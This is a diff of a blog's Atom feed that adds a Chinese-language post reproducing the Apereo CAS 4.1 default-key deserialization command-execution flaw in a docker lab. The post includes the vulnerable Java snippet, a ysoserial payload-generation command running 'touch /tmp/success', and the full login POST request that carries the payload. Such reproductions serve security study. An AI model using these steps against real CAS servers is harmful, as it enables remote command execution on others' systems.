@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://s40d1.github.io/"/>
-  <updated>2020-10-17T02:55:22.909Z</updated>
+  <updated>2020-10-17T09:22:48.101Z</updated>
   <id>https://s40d1.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+    <published>2020-10-17T09:25:28.829Z</published>
+    <updated>2020-10-17T09:22:48.101Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Apereo-CAS-4-1-反序列化命令执行漏洞复现"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞复现" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞复现"></a>Apereo CAS 4.1 反序列化命令执行漏洞复现</h1><p>[TOC]<br>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>执行如下命令启动一个Apereo CAS 4.1.5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。<br><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/EE4D2F3E0BE344A8B51C0D857F3C2493?ynotemdtimestamp=1602926359557" alt="image"></p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptedTranscoder</span> <span class="keyword">implements</span> <span class="title">Transcoder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CipherBean cipherBean;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> compression = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EncryptedTranscoder</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean = <span class="keyword">new</span> BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(<span class="keyword">new</span> BufferedBlockCipherSpec(<span class="string">"AES"</span>, <span class="string">"CBC"</span>, <span class="string">"PKCS7"</span>));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(<span class="keyword">this</span>.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(<span class="string">"aes128"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(<span class="string">"changeit"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(<span class="keyword">new</span> RBGNonce());</span><br><span class="line">        <span class="keyword">this</span>.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="external nofollow noopener noreferrer">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/8C97B3F1CE11421AB3A3A5590A5E74B1?ynotemdtimestamp=1602926359557" alt="image"></p><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;your-ip:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/376054668D7843C49F9C5CF0D4ADEB81?ynotemdtimestamp=1602926359557" alt="image"></p><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行，即漏洞复现成功：</p><p><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/308FB455D9B24A488C18489DCA7A57AD?ynotemdtimestamp=1602926359557" alt="image"></p><h2 id="三、防御措施"><a href="#三、防御措施" class="headerlink" title="三、防御措施"></a>三、防御措施</h2><p>升级到安全版本版本。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Apereo-CAS-4-1-反序列化命令执行漏洞复现&quot;&gt;&lt;a href=&quot;#Apereo-CAS-4-1-反序列化命令执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;Apereo CAS 4.1 反序列化命令执行漏洞复现&quot;&gt;&lt;/a&gt;Apere
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="漏洞复现" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+  </entry>
   
   <entry>
     <title></title>
@@ -531,30 +559,6 @@
     
     
       <category term="代码审计" scheme="https://s40d1.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>article title</title>
-    <link href="https://s40d1.github.io/wiki/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
-    <id>https://s40d1.github.io/wiki/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
-    <published>2020-06-23T16:13:37.000Z</published>
-    <updated>2020-06-23T16:15:56.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="第一篇文章"><a href="#第一篇文章" class="headerlink" title="第一篇文章"></a>第一篇文章</h1>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;第一篇文章&quot;&gt;&lt;a href=&quot;#第一篇文章&quot; class=&quot;headerlink&quot; title=&quot;第一篇文章&quot;&gt;&lt;/a&gt;第一篇文章&lt;/h1&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="攻防演练" scheme="https://s40d1.github.io/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
     
     
   </entry>
